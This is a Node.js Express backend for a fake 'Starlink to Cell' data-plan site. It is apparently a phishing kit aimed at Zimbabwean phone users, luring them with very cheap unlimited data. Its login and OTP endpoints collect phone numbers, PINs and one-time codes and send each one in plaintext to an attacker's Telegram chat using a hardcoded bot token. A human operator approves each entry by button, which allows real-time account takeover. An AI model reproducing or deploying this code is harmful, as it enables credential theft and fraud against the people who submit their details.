const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// CORS - FULLY ENABLED
// ============================================
app.use(cors({
  origin: '*',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin']
}));

// Handle preflight requests
app.options('*', cors());

// Additional CORS headers
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, Accept, Origin');
  res.header('Access-Control-Allow-Credentials', 'true');
  if (req.method === 'OPTIONS') {
    return res.status(200).send('OK');
  }
  next();
});

// ============================================
// MIDDLEWARE
// ============================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================
// HEALTH CHECK ENDPOINT
// ============================================
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    message: 'Server is running',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// ============================================
// TELEGRAM CONFIGURATION
// ============================================
const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
const CHAT_ID = '8392790531';

// Store pending login requests
const pendingRequests = {};

// ============================================
// SET TELEGRAM WEBHOOK - UPDATED URL
// ============================================
app.get('/api/set-webhook', async (req, res) => {
  try {
    const webhookUrl = `https://starlink-production-c046.up.railway.app/api/telegram/callback`; // <-- UPDATED
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: webhookUrl
      })
    });
    
    const data = await response.json();
    console.log('📤 Webhook set:', data);
    
    res.json({
      success: data.ok,
      message: data.description || 'Webhook set successfully',
      data: data
    });
  } catch (error) {
    console.error('❌ Webhook error:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// ============================================
// SEND TELEGRAM LOGIN REQUEST
// ============================================
async function sendTelegramLoginRequest(phone, pin, requestId) {
  try {
    const message = `📡 *New Starlink to Cell Login Request*\n\n📱 *Phone:* +263 ${phone}\n🔢 *PIN:* ${pin}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n⚠️ Please approve or deny this login request.`;

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ Approve', callback_data: `approve_${requestId}` },
              { text: '❌ Deny', callback_data: `deny_${requestId}` }
            ]
          ]
        }
      })
    });

    const data = await response.json();
    console.log('📤 Telegram Login Request:', data.ok ? '✅ Sent' : '❌ Failed');
    return data;
  } catch (error) {
    console.error('❌ Telegram error:', error.message);
    return null;
  }
}

// ============================================
// HANDLE TELEGRAM CALLBACK (Approve/Deny)
// ============================================
app.post('/api/telegram/callback', async (req, res) => {
  try {
    const { callback_data } = req.body;

    console.log('📥 Callback received:', callback_data);

    if (!callback_data) {
      return res.status(400).json({ success: false, message: 'No callback data' });
    }

    const [action, requestId] = callback_data.split('_');

    if (!pendingRequests[requestId]) {
      return res.status(404).json({ success: false, message: 'Request not found' });
    }

    if (action === 'approve') {
      pendingRequests[requestId].status = 'approved';
      console.log('✅ Login approved for request:', requestId);
      
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `✅ *Login Approved*\n\n📱 Phone: +263 ${pendingRequests[requestId].phone}\n\nUser has been redirected to verify page.`,
          parse_mode: 'Markdown'
        })
      });

      res.json({ success: true, message: 'Login approved' });
    } else if (action === 'deny') {
      pendingRequests[requestId].status = 'denied';
      console.log('❌ Login denied for request:', requestId);

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `❌ *Login Denied*\n\n📱 Phone: +263 ${pendingRequests[requestId].phone}\n\nUser was denied access.`,
          parse_mode: 'Markdown'
        })
      });

      res.json({ success: true, message: 'Login denied' });
    } else {
      res.status(400).json({ success: false, message: 'Invalid action' });
    }
  } catch (error) {
    console.error('❌ Callback error:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============================================
// CHECK LOGIN STATUS ENDPOINT
// ============================================
app.get('/api/auth/login-status/:requestId', (req, res) => {
  const { requestId } = req.params;

  if (!pendingRequests[requestId]) {
    return res.status(404).json({
      success: false,
      message: 'Request not found'
    });
  }

  const status = pendingRequests[requestId].status;

  res.json({
    success: true,
    status: status,
    phone: pendingRequests[requestId].phone
  });
});

// ============================================
// LOGIN ENDPOINT
// ============================================
app.post('/api/auth/login', async (req, res) => {
  try {
    const { phoneNumber, pin } = req.body;

    console.log('🔑 Login attempt:', { phoneNumber, pin: '****' });

    if (!phoneNumber || !pin) {
      return res.status(400).json({
        success: false,
        message: 'Phone number and PIN are required'
      });
    }

    if (phoneNumber.length !== 9 || !/^\d{9}$/.test(phoneNumber)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 9-digit phone number'
      });
    }

    if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 4-digit PIN'
      });
    }

    const requestId = 'login_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);

    pendingRequests[requestId] = {
      phone: phoneNumber,
      pin: pin,
      status: 'pending',
      timestamp: new Date().toISOString()
    };

    await sendTelegramLoginRequest(phoneNumber, pin, requestId);

    res.json({
      success: true,
      message: 'Login request sent. Please wait for admin approval.',
      requestId: requestId,
      phoneNumber: phoneNumber,
      requiresVerification: true
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({
      success: false,
      message: 'Login failed',
      error: error.message
    });
  }
});

// ============================================
// REGISTER ENDPOINT
// ============================================
app.post('/api/auth/register', (req, res) => {
  const { phoneNumber, pin, fullName, email } = req.body;

  if (!phoneNumber || !pin || !fullName || !email) {
    return res.status(400).json({
      success: false,
      message: 'All fields are required'
    });
  }

  res.json({
    success: true,
    message: 'Registration successful',
    user: {
      phoneNumber,
      fullName,
      email
    }
  });
});

// ============================================
// VERIFY OTP ENDPOINT
// ============================================
app.post('/api/auth/verify-otp', async (req, res) => {
  try {
    const { phoneNumber, otp } = req.body;

    console.log('🔑 OTP verification:', { phoneNumber, otp });

    if (!phoneNumber || !otp) {
      return res.status(400).json({
        success: false,
        message: 'Phone number and OTP are required'
      });
    }

    if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 6-digit OTP'
      });
    }

    try {
      const message = `📡 *Starlink to Cell - OTP Verification*\n\n📱 *Phone:* +263 ${phoneNumber}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been verified and redirected to dashboard.`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });
    } catch (error) {
      console.error('Telegram OTP error:', error.message);
    }

    res.json({
      success: true,
      message: 'OTP verified successfully'
    });

  } catch (error) {
    console.error('OTP verification error:', error);
    res.status(500).json({
      success: false,
      message: 'OTP verification failed',
      error: error.message
    });
  }
});

// ============================================
// DATA PLANS ENDPOINT
// ============================================
app.get('/api/plans', (req, res) => {
  const plans = [
    {
      id: '5gb',
      name: '5GB Data',
      days: '2-Day Plan',
      price: 'Free trial',
      badge: 'New users only',
      isFree: true
    },
    {
      id: '15gb',
      name: '15GB Data',
      days: '7-Day Plan',
      price: 'USD 0.99',
      badge: 'Best for light users',
      isFree: false
    },
    {
      id: '35gb',
      name: '35GB Data',
      days: '14-Day Plan',
      price: 'USD 1.99',
      badge: 'Balanced',
      isFree: false
    },
    {
      id: '50gb',
      name: '50GB Data',
      days: '21-Day Plan',
      price: 'USD 2.99',
      badge: 'Heavy use',
      isFree: false
    },
    {
      id: 'monthly',
      name: 'Monthly Unlimited',
      days: '30-Day Plan',
      price: 'USD 3.99',
      badge: 'Most Popular',
      isFree: false
    },
    {
      id: '5g',
      name: '5G Monthly Unlimited',
      days: '30-Day Plan',
      price: 'USD 7.99',
      badge: '5G Coverage',
      isFree: false
    }
  ];

  res.json({
    success: true,
    plans: plans
  });
});

// ============================================
// 404 HANDLER
// ============================================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: 'Route not found',
    path: req.originalUrl
  });
});

// ============================================
// ERROR HANDLER
// ============================================
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.message);
  res.status(500).json({
    success: false,
    message: err.message || 'Internal server error'
  });
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
  console.log('====================================');
  console.log('📡 Starlink to Cell Backend Started');
  console.log('====================================');
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`✅ Health check: /api/health`);
  console.log(`✅ Set webhook: /api/set-webhook`);
  console.log(`🤖 Telegram Bot configured`);
  console.log(`📱 Chat ID: ${CHAT_ID}`);
  console.log('====================================');
});
